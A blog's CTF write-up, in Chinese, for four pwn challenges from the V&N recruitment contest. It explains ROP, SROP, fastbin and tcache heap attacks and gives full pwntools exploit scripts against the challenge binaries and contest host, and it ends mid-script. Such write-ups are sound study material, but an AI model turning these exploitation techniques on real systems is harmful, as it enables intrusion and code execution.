    <content type="html"><![CDATA[<h1 id="V-amp-N招新赛writeup"><a href="#V-amp-N招新赛writeup" class="headerlink" title="V&amp;N招新赛writeup"></a>V&amp;N招新赛writeup</h1><p>参考链接:<a href="https://www.lhyerror404.cn/2020/03/01/vn-%e8%80%83%e6%a0%b8%e8%b5%9b-writeup/" target="_blank" rel="noopener">https://www.lhyerror404.cn/2020/03/01/vn-%e8%80%83%e6%a0%b8%e8%b5%9b-writeup/</a></p><h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><p>题目首先给了puts函数的地址，可得出libc基址，比赛的时候老想着用栈迁移，但stack_addr是随机的，难度比较大。赛后看了小蓝师傅的博客，又学到了新姿势，返回地址覆盖成ret之后，执行两次ret，刚好返回到第一次输入的地方。然后进行ROP，这题用了prtctl函数把execve禁了，可以用open(flag),read(flag,libc_addr+0x3C6500,0x40),write(1,flag,0x40)获取到flag</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./vn_pwn_warmup'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(<span class="string">'vn.node3.buuoj.cn'</span>,<span class="number">52275</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">'./vn_pwn_warmup'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"gift: 0x"</span>)</span><br><span class="line"></span><br><span class="line">puts_addr=int(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">info(hex(puts_addr))</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">libc_addr=puts_addr-libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">info(hex(libc_addr))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">'Input something: '</span>)</span><br><span class="line">pop_rdi=<span class="number">0x21102</span></span><br><span class="line">pop_rsi=<span class="number">0x202e8</span></span><br><span class="line">pop_rax=<span class="number">0x33544</span></span><br><span class="line">pop_rdx=<span class="number">0x1b92</span></span><br><span class="line">syscall_ret=<span class="number">0xbc375</span></span><br><span class="line">ret=<span class="number">0x937</span></span><br><span class="line">payload = p64(libc_addr+pop_rdi)+p64(<span class="number">0</span>)+p64(libc_addr+pop_rsi)+p64(libc_addr+<span class="number">0x3C6500</span>)+p64(libc_addr+pop_rdx)+p64(<span class="number">0x40</span>)+p64(libc_addr+libc.sym[<span class="string">'read'</span>])</span><br><span class="line">payload += p64(libc_addr+pop_rdi)+p64(libc_addr+<span class="number">0x3C6500</span>)+p64(libc_addr+pop_rsi)+p64(<span class="number">0</span>)+p64(libc_addr+libc.sym[<span class="string">'open'</span>])</span><br><span class="line">payload += p64(libc_addr+pop_rdi)+p64(<span class="number">3</span>)+p64(libc_addr+pop_rsi)+p64(libc_addr+<span class="number">0x3C6600</span>)+p64(libc_addr+pop_rdx)+p64(<span class="number">0x40</span>)+p64(libc_addr+libc.sym[<span class="string">'read'</span>])</span><br><span class="line">payload += p64(libc_addr+pop_rdi)+p64(<span class="number">1</span>)+p64(libc_addr+pop_rsi)+p64(libc_addr+<span class="number">0x3C6600</span>)+p64(libc_addr+pop_rdx)+p64(<span class="number">0x40</span>)+p64(libc_addr+libc.sym[<span class="string">'write'</span>])</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'name?'</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x70</span>+p64(<span class="number">0</span>)+p64(libc_addr+ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(<span class="string">'flag\x00\x00\n'</span>)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure><h2 id="babypwn"><a href="#babypwn" class="headerlink" title="babypwn"></a>babypwn</h2><p>SROP参考:<a href="https://wiki.x10sec.org/pwn/stackoverflow/advanced_rop/#srop" target="_blank" rel="noopener">https://wiki.x10sec.org/pwn/stackoverflow/advanced_rop/#srop</a><br>这道题还是借鉴小蓝师傅的做法<br>程序调用了syscall(15,&amp;buf),当系统调用号为15时，程序会调用_rt_sigreturn并将我们的输入作为frame传入。然后就可以伪造frame，利用SROP执行read，在libc + 0x3C6500的rw-段布置ROP chain，并返回到其位置执行ORW攻击，程序开启了Sandbox不能执行execve<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">seccomp-tools dump ./vn_pwn_babypwn_1 </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x0d</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) goto <span class="number">0005</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x0a</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x09</span> <span class="number">0x00</span> <span class="number">0x00000009</span>  <span class="keyword">if</span> (A == mmap) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x08</span> <span class="number">0x00</span> <span class="number">0x0000000a</span>  <span class="keyword">if</span> (A == mprotect) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x07</span> <span class="number">0x00</span> <span class="number">0x00000029</span>  <span class="keyword">if</span> (A == socket) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x15</span> <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x0000002a</span>  <span class="keyword">if</span> (A == connect) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0009</span>: <span class="number">0x15</span> <span class="number">0x05</span> <span class="number">0x00</span> <span class="number">0x00000031</span>  <span class="keyword">if</span> (A == bind) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0010</span>: <span class="number">0x15</span> <span class="number">0x04</span> <span class="number">0x00</span> <span class="number">0x00000032</span>  <span class="keyword">if</span> (A == listen) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0011</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000038</span>  <span class="keyword">if</span> (A == clone) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0012</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000039</span>  <span class="keyword">if</span> (A == fork) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0013</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A == execve) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0014</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0015</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line"><span class="comment"># context.arch='i386'</span></span><br><span class="line"></span><br><span class="line">vn_pwn_babypwn_1=ELF(<span class="string">'./vn_pwn_babypwn_1'</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">    libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">elif</span> context.arch == <span class="string">'i386'</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        libc=ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        libc=ELF(<span class="string">"/lib32/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sh</span><span class="params">(other_libc = null)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> libc</span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">        <span class="keyword">if</span> other_libc <span class="keyword">is</span> <span class="keyword">not</span> null:</span><br><span class="line">            libc = ELF(<span class="string">"./"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line">        <span class="keyword">return</span> remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> process(<span class="string">"./vn_pwn_babypwn_1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_address</span><span class="params">(sh,info=null,start_string=null,end_string=null,offset=null,int_mode=False)</span>:</span></span><br><span class="line">    sh.recvuntil(start_string)</span><br><span class="line">    <span class="keyword">if</span> int_mode :</span><br><span class="line">        return_address=int(sh.recvuntil(end_string).strip(end_string),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">elif</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">        return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(<span class="number">4</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    log.success(info+str(hex(return_address+offset)))</span><br><span class="line">    <span class="keyword">return</span> return_address+offset</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">(sh)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'cat /flag'</span>)</span><br><span class="line">    <span class="keyword">return</span> sh.recvrepeat(<span class="number">0.3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_gdb</span><span class="params">(sh,stop=False)</span>:</span></span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    <span class="keyword">if</span> stop :</span><br><span class="line">        raw_input()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    sh = get_sh()</span><br><span class="line">    get_gdb(sh)</span><br><span class="line">    libc.address = get_address(sh,<span class="string">'The libc base address is '</span>,<span class="string">'Here is my gift: 0x'</span>,<span class="string">'\n'</span>,-libc.symbols[<span class="string">'puts'</span>],<span class="keyword">True</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Please input magic message: '</span>)</span><br><span class="line">    fake_frame  = p64(<span class="number">0</span>) * <span class="number">12</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RDI = RAX</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RSI = RDI</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RBP</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RBX</span></span><br><span class="line">    fake_frame += p64(libc.address + <span class="number">0x3C6500</span> - <span class="number">0x10</span>)          <span class="comment"># RDX = RSI</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RAX</span></span><br><span class="line">    fake_frame += p64(<span class="number">0x100</span>)                                   <span class="comment"># RCX = RDX</span></span><br><span class="line">    fake_frame += p64(libc.address + <span class="number">0x3C6500</span>)                 <span class="comment"># RSP</span></span><br><span class="line">    fake_frame += p64(libc.symbols[<span class="string">'syscall'</span>])                 <span class="comment"># RIP</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># eflags</span></span><br><span class="line">    fake_frame += p64(<span class="number">0x33</span>)                                    <span class="comment"># cs : gs : fs</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">    <span class="comment"># get_gdb(sh)</span></span><br><span class="line">    sh.send(fake_frame)</span><br><span class="line">    ROP_chain  = <span class="string">'/flag\x00\x00\x00'</span></span><br><span class="line">    ROP_chain += p64(<span class="number">0</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6500</span> - <span class="number">0x10</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'open'</span>])</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">3</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6700</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000001b92</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0x100</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'read'</span>])</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">1</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6700</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000001b92</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0x100</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'write'</span>])</span><br><span class="line">    <span class="comment">#raw_input('&gt;')</span></span><br><span class="line">    sh.send(ROP_chain)</span><br><span class="line">    <span class="keyword">print</span> sh.recv()</span><br></pre></td></tr></table></figure><h2 id="simpleHeap"><a href="#simpleHeap" class="headerlink" title="simpleHeap"></a>simpleHeap</h2><p>off-by-one漏洞，利用堆块重叠修改下一个堆块的size，造成overlap，可leak出libc_addr,再利用overlap进行fastbin attack，修改malloc_hook为one_gadget。但是此处所有的one_gadget条件均不满足，因此需要利用realloc函数调整栈帧。</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./vn_pwn_simpleHeap'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(<span class="string">'vn.node3.buuoj.cn'</span>,<span class="number">52145</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./vn_pwn_simpleHeap'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(lenght,cont)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">p.sendline(str(lenght))</span><br><span class="line">p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">p.send(cont)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,cont)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">p.send(cont)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(num)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">'\x00'</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x58</span>,<span class="string">'\x00'</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'\x00'</span>) <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk overlap</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'\x00'</span>*<span class="number">0x18</span>+<span class="string">'\xd1'</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'A'</span>) <span class="comment"># 1</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) <span class="number">-0x3c4c41</span></span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4526a</span>  </span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">'__libc_realloc'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># free fastbin</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0x71</span>)+p64(malloc_hook<span class="number">-0x23</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">11</span>+p64(one_gadget)+p64(realloc+<span class="number">14</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'size?'</span>,str(<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="easy-heap"><a href="#easy-heap" class="headerlink" title="easy_heap"></a>easy_heap</h2><p>ubuntu18.04的uaf漏洞，有tcache机制，限制了free的次数为3，申请一个0x88的堆块释放两次，可以先利用Tcache dup泄露Heap address，然后再申请劫持Tcache structure，向任意地址读写，向malloc_hook写one_gadget完成利用，但是此处所有的one_gadget条件均不满足，因此需要利用realloc函数调整栈帧才能利用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'size?'</span>,str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'idx?'</span>,str(idx))</span><br><span class="line">p.sendafter(<span class="string">'content:'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.sendlineafter(<span 